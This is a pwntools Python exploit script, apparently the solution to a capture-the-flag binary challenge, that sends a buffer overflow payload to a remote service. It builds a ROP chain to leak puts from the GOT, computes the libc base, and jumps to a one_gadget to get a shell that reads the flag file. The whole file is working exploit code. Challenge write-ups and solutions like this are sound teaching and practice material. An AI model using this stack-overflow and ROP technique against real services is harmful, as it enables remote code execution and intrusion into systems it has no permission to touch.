import os

nc, host, port = os.getenv("CONNECT").split(" ")

from pwn import ELF, flat, context, remote, u64

context.arch = "amd64"
context.log_level = "error"

offset = 0x20
payload_len = 0x47

chal = ELF("./handout/chal")
main = chal.symbols["main"]
pop_rda = main - 2

conn = remote(host, port)
conn.recvline()  # what's your name
conn.send(
    flat(
        b"A" * offset,
        chal.bss(0x400),  # saved rbp
        pop_rda,
        chal.got["puts"],
        main + 19,  # mov rdi, rax; call puts;
        word_size=64,
        length=payload_len,
    ),
)
res = conn.recvline().strip()
puts_addr = u64(res.ljust(8, b"\x00"))

libc = ELF("./handout/libc.so.6")
libc.address = puts_addr - libc.symbols["puts"]

conn.send(
    flat(
        b"A" * offset,
        chal.bss(0x400),  # saved rbp
        pop_rda,
        0,
        libc.address + 0xEF52B,  # one_gadget
        word_size=64,
        length=payload_len,
    )
)

conn.sendline(b"cat flag*")
print(conn.recvall(timeout=1).decode())
